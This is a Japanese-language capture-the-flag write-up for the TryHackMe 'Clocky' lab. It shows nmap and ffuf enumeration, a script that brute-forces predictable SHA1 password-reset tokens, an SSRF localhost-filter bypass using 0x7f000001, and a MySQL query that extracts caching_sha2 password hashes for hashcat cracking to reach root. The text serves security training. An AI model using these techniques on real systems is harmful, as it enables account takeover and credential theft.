# Clocky CTF

https://tryhackme.com/room/clocky

## Enumeration

```shell
TARGET=10.48.150.100
sudo bash -c "echo $TARGET   clocky >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8000/tcp open  http-alt   syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,8000,8080 $TARGET

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.41
8000/tcp open  http       nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy Werkzeug/2.2.3 Python/3.8.10
```

SSH, HTTP * 3

### dirb

80 : すべて403Forbidden

8000 : robots.txtだけ発見

8080 : 下記3つ発見
```
+ http://clocky:8080/administrator (CODE:200|SIZE:1609)                                                              
+ http://clocky:8080/dashboard (CODE:302|SIZE:215)                                                                   
+ http://clocky:8080/forgot_password (CODE:200|SIZE:1516)
```

robots.txt でフラグ１発見

```sh
$ curl http://clocky:8000/robots.txt
User-agent: *
Disallow: /*.sql$
Disallow: /*.zip$
Disallow: /*.bak$

Flag 1: THM{...}
```

### ディレクトリ列挙

robots.txt に出ていた3拡張子を探す。index.zip を発見。

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=sql,zip,bak -u http://clocky:8000 -w ./dirlist.txt -t 64 -k
/index.zip            (Status: 200) [Size: 1922]
/robots.txt           (Status: 200) [Size: 115]
```

展開したらフラグ2が出てきた。

```sh
$ ls -al
total 24
drwxrwxr-x  2 kali kali 4096 Dec  9 10:24 .
drwxrwxr-x 10 kali kali 4096 Dec  9 10:07 ..
-rw-r--r--  1 kali kali 4446 Oct 25  2023 app.py
-rw-r--r--  1 kali kali   38 May 19  2023 flag2.txt
-rw-rw-r--  1 kali kali 1922 Oct 25  2023 index.zip
```

## app.py

8080 のアプリケーションソースコード。

```python
# Not done with correct imports
# Some missing, some needs to be added
# Some are not in use...? Check flask imports please. Many are not needed
from flask import Flask, flash, redirect, render_template, request, session, abort, Response
from time import gmtime, strftime
from dotenv import load_dotenv
import os, pymysql.cursors, datetime, base64, requests


# Execute "database.sql" before using this
load_dotenv()
db = os.environ.get('db')


# Connect to MySQL database
connection = pymysql.connect(host="localhost",
                                                                user="clocky_user",
                                                                password=db,
                                                                db="clocky",
                                                                cursorclass=pymysql.cursors.DictCursor)

app = Flask(__name__)


# A new app will be deployed in prod soon
# Implement rate limiting on all endpoints
# Let's just use a WAF...?
# Not done (16/05-2023, jane)
@app.route("/")
def home():
        current_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
        return render_template("index.html", current_time=current_time)



# Done (16/05-2023, jane)
@app.route("/administrator", methods=["GET", "POST"])
def administrator():
        if session.get("logged_in"):
                return render_template("admin.html")

        else:
                if request.method == "GET":
                        return render_template("login.html")

                if request.method == "POST":
                        user_provided_username = request.form["username"]
                        user_provided_password = request.form["password"]


                        try:
                                with connection.cursor() as cursor:

                                        sql = "SELECT ID FROM users WHERE username = %s"
                                        cursor.execute(sql, (user_provided_username))

                                        user_id = cursor.fetchone()
                                        user_id = user_id["ID"]

                                        sql = "SELECT password FROM passwords WHERE ID=%s AND password=%s"
                                        cursor.execute(sql, (user_id, user_provided_password))

                                        if cursor.fetchone():
                                                session["logged_in"] = True
                                                return redirect("/dashboard", code=302)

                        except:
                                pass

                        message = "Invalid username or password"
                        return render_template("login.html", message=message)

# Work in progress (10/05-2023, jane)
# Is the db really necessary?
@app.route("/forgot_password", methods=["GET", "POST"])
def forgot_password():
        if session.get("logged_in"):
                return render_template("admin.html")

        else:
                if request.method == "GET":
                        return render_template("forgot_password.html")

                if request.method == "POST":
                        username = request.form["username"]
                        username = username.lower()

                        try:
                                with connection.cursor() as cursor:

                                        sql = "SELECT username FROM users WHERE username = %s"
                                        cursor.execute(sql, (username))

                                        if cursor.fetchone():
                                                value = datetime.datetime.now()
                                                lnk = str(value)[:-4] + " . " + username.upper()
                                                lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
                                                sql = "UPDATE reset_token SET token=%s WHERE username = %s"
                                                cursor.execute(sql, (lnk, username))
                                                connection.commit()

                        except:
                                pass

                        message = "A reset link has been sent to your e-mail"
                        return render_template("forgot_password.html", message=message)


# Done
@app.route("/password_reset", methods=["GET"])
def password_reset():
        if request.method == "GET":
                # Need to agree on the actual parameter here (12/05-2023, jane)
                if request.args.get("TEMPORARY"):
                        # Not done (11/05-2023, clarice)
                        # user_provided_token = request.args.get("TEMPORARY")

                        try:
                                with connection.cursor() as cursor:

                                        sql = "SELECT token FROM reset_token WHERE token = %s"
                                        cursor.execute(sql, (user_provided_token))
                                        if cursor.fetchone():
                                                return render_template("password_reset.html", token=user_provided_token)

                                        else:
                                                return "<h2>Invalid token</h2>"

                        except:
                                pass

                else:
                        return "<h2>Invalid parameter</h2>"
        return "<h2>Invalid parameter</h2>"



# Debug enabled during dev
# TURN OFF ONCE IN PROD!
# This can be very dangerous
# ref https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected-path-traversal

# Use gunicorn?
if __name__ == "__main__":
        app.secret_key = os.urandom(256)
        app.run(host="0.0.0.0", port="8080", debug=True)
```

- ユーザー名 `jane`, `clarice` を確認
- リセットトークンの生成ロジック

```python
value = datetime.datetime.now()
lnk = str(value)[:-4] + " . " + username.upper()
lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
```

- ローカルで実行したとき、lnkは下記の形式になる。

```python
>>> print(lnk)
2025-12-09 10:40:30.66
```

トップページの時刻表示から、ローカルタイムのマイナス9時間と考える。

```
The current time is 2025-12-09 01:41:24
```

jane または clarice としてパスワードリセットしたとき、2000件のリストを用いれば、前後10秒のトークンをブルートフォースできる。

jane をリセットしてすぐに出力したローカル時間表示

```sh
>>> print(str(datetime.datetime.now())[:-4])
2025-12-09 10:48:46.60
```

サーバー上では、`2025-12-09 01:48:46.60` となる。

ソースコードではパラメータ名が仮なので、ファジングする。tokenと判明。

```sh
root@ip-10-48-106-192:~# ffuf -u http://clocky:8080/password_reset?FUZZ=dummy -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fr 'Invalid parameter'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://clocky:8080/password_reset?FUZZ=dummy
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Invalid parameter
________________________________________________

token                   [Status: 200, Size: 22, Words: 2, Lines: 1]
:: Progress: [2588/2588] :: Job [1/1] :: 1273 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

gentime.py  
トークンのリスト前後10秒、2000件を出力するスクリプト(ChatGPT製)。

```python
from datetime import datetime, timedelta
import hashlib

base_str = "2025-12-09 01:48:46.60"  # 中心時刻
N = 2000
span_seconds = 10  # ±10秒

# --- 小数部を正しく読み込む ---
if '.' in base_str:
    prefix, frac = base_str.rsplit('.', 1)
    frac = frac.rstrip()
    # センチ秒 -> マイクロ秒へ変換 (例: "60" -> 600000)
    frac6 = (frac + '0' * 4)[:6]  # 2桁を6桁に変換
    base_dt = datetime.strptime(prefix, "%Y-%m-%d %H:%M:%S")
    base_dt = base_dt.replace(microsecond=int(frac6))
else:
    base_dt = datetime.strptime(base_str, "%Y-%m-%d %H:%M:%S")

start = base_dt - timedelta(seconds=span_seconds)
end = base_dt + timedelta(seconds=span_seconds)

# 均等間隔計算
step_seconds = (end - start).total_seconds() / (N - 1)
step = timedelta(seconds=step_seconds)

# --- 出力 ---
out_path = "timestamps_centiseconds.txt"
with open(out_path, "w") as f:
    cur = start
    for _ in range(N):
        # センチ秒表示（小数以下2桁）
        formatted = f"{cur.strftime('%Y-%m-%d %H:%M:%S')}.{int(cur.microsecond/10000):02d}"
        lnk = formatted + " . " + "jane".upper()
        lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
        f.write(lnk + "\n")
        cur += step

print(f"Saved to {out_path}")
```

jane に対してはヒットしなかった。トークンが間違っているかjaneが存在しないかのどちらか。  
clarice, admin, dev も同様。

```sh
ffuf -u http://clocky:8080/password_reset?token=FUZZ -w ./timestamps_centiseconds.txt -fr 'Invalid token'
```

administrator でヒットした。

```sh
$ ffuf -u http://clocky:8080/password_reset?token=FUZZ -w ./timestamps_centiseconds.txt -fr 'Invalid token'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://clocky:8080/password_reset?token=FUZZ
 :: Wordlist         : FUZZ: /home/kali/ctf/clocky/timestamps_centiseconds.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid token
________________________________________________

53a009e0f75b81ad1ba591477c296f2cd6a87749 [Status: 200, Size: 1627, Words: 665, Lines: 54, Duration: 166ms]
:: Progress: [2000/2000] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

このトークンを使ってパスワードリセットし、ログインしたらフラグ３が表示された。

## dashboard (8080)

location でHTTPホストしたファイルを指定したらリクエストが来て、file.txt としてダウンロードされた。  
サーバー上の80、8000ポートを指定しても403のままだった。  

内部ポートをスキャン。`127`が含まれる場合に、`Action not permitted` が返っている模様。  
`127.0.0.1` を防ぐためのフィルターと思われる。localhostが含まれても同様。

```sh
$ ffuf -u http://clocky:8080/dashboard -X POST -d 'location=http://10.48.150.100:FUZZ' -w ./ports.txt -fs 0 -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aTeNeg.-8nrHGC8F6i8xbs0CkG2TqKpX0k' -H 'Content-Type: application/x-www-form-urlencoded'
________________________________________________

80                      [Status: 200, Size: 278, Words: 20, Lines: 10, Duration: 169ms]
127                     [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 164ms]
1127                    [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 162ms]
1270                    [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 163ms]
1271                    [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 164ms]
1272                    [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 163ms]
1273                    [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 162ms]
1274                    [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 165ms]
...
6127                    [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 163ms]
7127                    [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 165ms]
8000                    [Status: 200, Size: 162, Words: 4, Lines: 8, Duration: 167ms]
8080                    [Status: 200, Size: 6206, Words: 795, Lines: 310, Duration: 165ms]
8127                    [Status: 200, Size: 1597, Words: 643, Lines: 53, Duration: 164ms]
...
```

http://0x7f000001/ でフィルターを回避できて80ポートにアクセス。

```html
<h2>Internal dev storage</h2>
```

database.sql を発見。念のため .bak も検索したが無かった。

```sh
root@ip-10-48-124-56:~# ffuf -u http://clocky:8080/dashboard -X POST -d 'location=http://0x7f000001/FUZZ.sql' -w ./dirlist.txt -fs 272,1597 -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aTeNeg.-8nrHGC8F6i8xbs0CkG2TqKpX0k' -H 'Content-Type: application/x-www-form-urlencoded'

...
database                [Status: 200, Size: 1636, Words: 231, Lines: 58]
...
```

ダウンロードした database.sql でフラグ4を発見。

この中にあったパスワードで、clariceとしてSSH接続できた。

```sh
clarice@ip-10-48-150-100:~$ 
```

## 権限昇格

app/.env のパスワードを使いDB接続できるが、役に立つ情報は見つからない。

```sh
clarice@ip-10-48-158-122:~/app$ cat .env
db=[REDACTED]
```

権限昇格について自分が知る限り全て列挙したが、ギブアップ。  
以下、https://0xb0b.gitbook.io/writeups/tryhackme/2024/clocky より。

mysql.user.authentication_string を表示。  
authentication_string は `$A$005$` で始まるハッシュだが、印字不可能文字を含むバイナリのためhexに変換している。  
hashcat(7401) は `$mysql$A$005*F9CC98CE0・・・` のような形であり、関連性がある。

```sh
mysql> select User, hex(authentication_string) from user;
```

hashcat(7401) に準拠したハッシュを出力するクエリ

```sql
mysql> SELECT user, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
```

hashcat でクラックできたパスワードを使ってrootに昇格。

```sh
clarice@ip-10-48-158-122:~/app$ su -
Password: 
root@ip-10-48-158-122:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- administrator ユーザーの発見が地味にきつかった。
- mysql.user テーブルのパスワードハッシュは初見でとても勉強になった。今まで mysql テーブルは何も考えずにスルーしていたが、認識を改めなければならない。
- SQLをコピペだけして終わりにするのも何なので、解析しておく。

```sql
mysql> SELECT user, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
```

1. `$A$005` を取り出す
2. `$A$005$` の後ろの部分を切り出し、HEX文字列変換
3. HEX文字列の 41 文字目に `*` を挿入（ソルトが20文字であり、HEX化により40桁になっているため）
4. 最終的に、`$mysql$A$005*<hex_salt>*<hex_hash>` の形に結合

下記は、hashcat(7401) 対応のハッシュ例。

```
$mysql$A$005*F9CC98CE08892924F50A213B6BC571A2C11778C5*625479393559393965414D45316477456B484F41316E64484742577A2E3162785353526B7554584647562F
```

## Tags

#tags:SSRF #tags:アプリケーション保存の認証情報(MySQL)
